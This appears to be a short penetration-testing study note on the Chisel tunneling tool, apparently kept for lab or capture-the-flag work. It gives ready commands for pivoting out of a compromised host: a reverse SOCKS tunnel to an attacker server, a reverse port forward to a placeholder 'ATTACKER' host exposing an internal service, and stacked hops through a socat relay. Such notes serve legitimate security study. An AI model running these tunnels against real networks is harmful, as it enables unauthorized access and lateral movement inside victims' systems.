---
type: tool
category: tunneling
related: ["[[pivoting]]", "[[port-forwarding]]", "[[proxychains]]"]
---

# Chisel

Fast TCP/UDP tunnel over HTTP/WebSocket — pivoting when you *don't* have SSH (web shell only, no root, or egress filtering).

## Reverse SOCKS

```sh
# attacker (server)
chisel server --reverse --port 33
# compromised host (client)
./chisel client 10.10.10.1:33 R:socks
```

`R:socks` makes the **server** open a local SOCKS port (`1080` by default) that egresses from the client's network position. Point [[proxychains]] at it and arbitrary tools route through the pivot.

## Reverse port forward

```sh
./chisel client ATTACKER:8000 R:8080:10.10.10.5:80   # expose an internal service to the attacker
```

## Stacking hops

A second client can register on a *different* SOCKS port so both subnets stay reachable from one config:

```sh
./chisel client 20.20.20.2:333 R:1081:socks   # inner hop, via a socat relay to the real server
```

## Seen in

[[littlepivoting]] (manual re-run: reverse SOCKS on `:1080` from `inclusion`, second hop on `:1081` from `trust` reached through a [[socat]] relay).
